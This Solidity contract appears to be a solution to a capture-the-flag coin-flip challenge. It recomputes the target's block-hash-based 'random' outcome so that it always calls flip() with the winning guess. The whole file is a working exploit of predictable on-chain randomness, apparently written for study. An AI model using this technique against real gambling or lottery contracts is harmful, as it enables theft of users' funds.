// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './SafeMath.sol';
import "hardhat/console.sol";
import "./CoinFlip.sol";

contract HackCoinFlip {
    using SafeMath for uint256;
    CoinFlip coinFlipContract;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipContract) public {
        coinFlipContract = CoinFlip(_coinFlipContract);
        console.log("factor %s", FACTOR);
        console.log("address %s", _coinFlipContract);
    }

    function getConsecutiveWins() public view returns (uint256){
        uint256 consWins = coinFlipContract.consecutiveWins();
        return consWins;
    }

    function makeGuess() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        console.log("factor %s", FACTOR);
        uint256 coinFlip = blockValue.div(FACTOR);
        bool guess = coinFlip == 1 ? true : false;

        coinFlipContract.flip(guess);
    }
}
